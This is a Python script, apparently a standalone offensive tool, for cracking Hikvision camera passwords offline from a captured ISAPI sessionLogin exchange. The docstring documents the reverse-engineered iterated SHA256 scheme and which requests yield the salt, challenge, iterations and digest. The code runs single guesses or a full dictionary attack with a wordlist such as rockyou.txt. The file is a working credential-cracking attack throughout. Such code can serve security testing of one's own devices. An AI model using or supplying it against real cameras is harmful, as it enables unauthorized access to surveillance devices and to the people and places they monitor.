#!/usr/bin/env python3
"""
Hikvision ISAPI sessionLogin — offline password verifier / dictionary attack.

Recovers the plaintext password from a captured /ISAPI/Security/sessionLogin
exchange. Everything needed is transmitted in the clear (inside TLS) during a
normal login, so a single captured session enables unlimited offline guessing
with no further contact with the device.

Algorithm (derived empirically against a known password, V2.2.65):

    h = SHA256(username + salt + password)
    h = SHA256(h + challenge)
    repeat (iterations - 2) more times:  h = SHA256(h)

All intermediate values are lowercase hex strings, and each SHA256 is taken
over the ASCII hex text of the previous digest -- not over raw bytes.

Capture the four inputs from the decrypted session:
    salt, challenge, iterations   <- GET  /ISAPI/Security/sessionLogin/capabilities
    password (the digest)         <- POST /ISAPI/Security/sessionLogin

Usage:
    # verify a single candidate
    ./hik_login_hash.py --user admin --salt DTB9... --challenge f813... \
                        --iterations 100 --target 913aad... --password 'guess'

    # dictionary attack
    ./hik_login_hash.py --user admin --salt DTB9... --challenge f813... \
                        --iterations 100 --target 913aad... --wordlist rockyou.txt
"""

import argparse
import hashlib
import sys
import time


def hik_hash(user: str, salt: str, challenge: str, iterations: int, password: str) -> str:
    h = hashlib.sha256((user + salt + password).encode()).hexdigest()
    h = hashlib.sha256((h + challenge).encode()).hexdigest()
    for _ in range(2, iterations):
        h = hashlib.sha256(h.encode()).hexdigest()
    return h


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--user", default="admin")
    p.add_argument("--salt", required=True)
    p.add_argument("--challenge", required=True)
    p.add_argument("--iterations", type=int, default=100)
    p.add_argument("--target", required=True, help="the <password> digest from sessionLogin")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--password", help="single candidate to verify")
    g.add_argument("--wordlist", help="file of candidates, one per line")
    a = p.parse_args()

    target = a.target.strip().lower()

    if a.password:
        got = hik_hash(a.user, a.salt, a.challenge, a.iterations, a.password)
        ok = got == target
        print(f"computed : {got}")
        print(f"expected : {target}")
        print("MATCH — this is the password" if ok else "no match")
        return 0 if ok else 1

    tried = 0
    start = time.time()
    with open(a.wordlist, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            candidate = line.rstrip("\n")
            if hik_hash(a.user, a.salt, a.challenge, a.iterations, candidate) == target:
                elapsed = time.time() - start
                print(f"\nFOUND after {tried:,} candidates in {elapsed:.1f}s: {candidate!r}")
                return 0
            tried += 1
            if tried % 20000 == 0:
                rate = tried / (time.time() - start)
                print(f"  {tried:,} tried  ({rate:,.0f}/s)", end="\r", file=sys.stderr)

    elapsed = time.time() - start
    print(f"\nexhausted {tried:,} candidates in {elapsed:.1f}s — not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
